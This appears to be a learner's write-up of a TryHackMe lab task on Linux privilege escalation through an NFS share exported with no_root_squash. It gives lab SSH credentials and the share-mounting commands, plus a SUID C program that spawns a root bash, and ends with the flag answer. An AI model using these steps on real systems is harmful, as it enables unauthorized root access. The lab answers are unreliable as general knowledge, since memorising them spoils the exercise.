**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

**Alternatively, you can access it over SSH with the low-privilege user credentials below:  
**

**Username: karen**

**Password: Password1**

  

Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.  
  
Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.  
  
NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

![](https://i.imgur.com/irDQTze.png)  

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.  
  
We will start by enumerating mountable shares from our attacking machine.

![](https://i.imgur.com/CmXPDcv.png)  

We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.

  

![](https://i.imgur.com/DwAB1qs.png)  

  

As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.

  

![](https://i.imgur.com/nWKpFkK.png)  

  

Once we compile the code we will set the SUID bit.

  

![](https://i.imgur.com/rkZOOjZ.png)  

  

You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).

  

![](https://i.imgur.com/U7IjT38.png)  

  

Notice the nfs executable has the SUID bit set on the target system and runs with root privileges.

Answer the questions below

| Question                                                         | Answer |
| ---------------------------------------------------------------- | ------ |
| How many mountable shares can you identify on the target system? | 3      | 

Show mountable shares:

	- From attacker's machine:

```
showmount -e {target_IP}
```

![[Pasted image 20231216232338.png]]


| Question                                                  | Answer |
| --------------------------------------------------------- | ------ |
| How many shares have the "no_root_squash" option enabled? |        |

Read NFS configuration:

On target machine:

```
cat /etc/exports
```

![[Pasted image 20231216232933.png]]


| Question                               | Answer |
| -------------------------------------- | ------ |
| Gain a root shell on the target system |        |


Go to /mnt folder and create some folder (i.e. thmTest). Mount one of the mountable shares on the attacker machine:

```
mount -o rw 10.10.71.74:/home/ubuntu/sharedfolder /mnt/thmTest
```

![[Pasted image 20231216235111.png]]


Create c file with the following content:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main (void) {
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
        return 0;
}
```

and compile it using gcc:

```
gcc code.c -o code
```


![[Pasted image 20231216235019.png]]

Add execute permissions and SUID bit to the new file:

![[Pasted image 20231216235400.png]]

![[Pasted image 20231216235652.png]]


From target machine, list /home/ubuntu/sharedfolder:

![[Pasted image 20231216235235.png]]

Execute the executable file (code):

![[Pasted image 20231217001056.png]]

and gain root privileges


| Question                                   | Answer       |
| ------------------------------------------ | ------------ |
| What is the content of the flag7.txt file? | THM-89384012 | 

The flag is in `/home/matt/flag7.txt`
